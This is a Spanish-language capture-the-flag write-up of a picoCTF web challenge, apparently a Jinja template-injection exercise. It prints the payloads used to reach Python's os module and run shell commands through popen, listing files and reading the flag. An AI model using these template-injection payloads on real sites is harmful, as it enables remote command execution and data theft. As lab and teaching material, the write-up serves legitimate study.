## Descripción :
	I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53072/)!
## Solución :
 Primero confirme que la pagina dada estacha hecha con python usando el comando whatweb y sabiendo que python usa plantillas de jinja , intente probando una inyección de plantilla para ver si el sitio era vulnerable
 ```
 {{4*4}}
```
, como lo era entonces accedí a variables globales y estaba el 'os' entonces accedí al modulo os desde el ámbito global
```
{{ config.__class__.__init__.__globals__['os'] }}


{{ config.__class__.__init__.__globals__ }}

```

,  ahí utilice el comando 'popen' para poder ejecutar comandos shell donde use un ls para ver los archivos de os
 ```
 {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
  , y le hice un cat al archivo bandera, asi obtuve la flag 
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}

```